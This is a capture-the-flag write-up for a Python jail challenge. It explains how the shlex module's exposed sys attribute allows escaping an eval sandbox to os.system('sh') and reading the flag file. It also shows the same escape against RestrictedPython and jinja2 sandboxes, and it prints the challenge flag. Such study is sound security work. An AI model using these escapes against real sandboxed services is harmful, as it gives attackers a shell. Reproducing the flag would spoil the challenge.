# You've Got Shlex

[日本語はこちら](./README-ja.md)

## Description

And that's the only thing you get!

## Writeup

### Overview

This is a simple Pyjail. The input must be ASCII and cannot contain `_`. However, the `shlex` module is provided in the environment.

```python
import shlex

code = input("jail >")

if not code.isascii():
    print("Not ascii")
    exit()

if "_" in code:
    print("No dunder methods/attributes")
    exit()

eval(code, {"shlex": shlex, "__builtins__": {}})
```

### Solution

In this challenge, all built-in functions are cleared (`__builtins__` is empty). There are [multiple ways](https://shirajuki.js.org/blog/pyjail-cheatsheet/#subclasses) to achieve RCE without built-in functions, but all of them require `_` somewhere in the payload, typically to access dunder attributes.

Hence, we must find a way to utilize the `shlex` module. The official documentation suggests that the functions and classes defined in `shlex` themselves do not lead to RCE. Let's inspect the module using the `dir` function, which lists the available attributes of a given object:

```
>>> import shlex
>>> [x for x in dir(shlex) if "_" not in x]
['StringIO', 'join', 'quote', 'shlex', 'split', 'sys']
```

We can access `sys`, which looks very promising.

For example, `sys.breakpointhook()` is essentially the same as `breakpoint()`, which can be leveraged for RCE. Let's see if we can use this:

```
jail >shlex.sys.breakpointhook()
Traceback (most recent call last):
  File "/app/jail.py", line 14, in <module>
    eval(code, {"shlex": shlex, "__builtins__": {}})
    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
KeyError: '__import__'
```

Unfortunately, `breakpoint()` cannot be used in an environment where `__import__` is unavailable.

The solution is to use `sys.modules`. This dictionary contains all modules that are currently loaded. Some modules, such as `os`, are already loaded because they are used during startup. We can use this to access `os.system`:

```
jail >shlex.sys.modules["os"].system("sh")
cat /flag*   
Alpaca{the_most_nonsensical_use_of_shlex_in_pyjail}
```

Alternatively, you can access the `builtins` module, which contains all the built-in functions:

```
jail >shlex.sys.modules["builtins"].print(shlex.sys.modules["builtins"].open("/flag.txt").read())
Alpaca{the_most_nonsensical_use_of_shlex_in_pyjail}
```

## Discussion

In a Python sandbox, preventing access to dunder attributes is one of the most effective ways to secure the environment. Therefore, any module that exposes access to `sys` can be a major security vulnerability.

For example, in `RestrictedPython`, allowing `shlex` along with `_getitem_` allows RCE:

```python
from RestrictedPython import compile_restricted
from RestrictedPython import safe_globals
from RestrictedPython.Eval import default_guarded_getitem
import shlex

safe_globals['_getitem_'] = default_guarded_getitem

eval(compile_restricted("shlex.sys.modules['os'].system('sh')", '<inline>', 'eval'), safe_globals, {"shlex": shlex})
```

In `jinja2.sandbox`, exposing `shlex` leads to RCE:

```python
from jinja2.sandbox import SandboxedEnvironment
import shlex

env = SandboxedEnvironment()

env.from_string("{{ shlex.sys.modules['os'].system('sh') }}").render(shlex=shlex)
```


## Flag

`Alpaca{the_most_nonsensical_use_of_shlex_in_pyjail}`
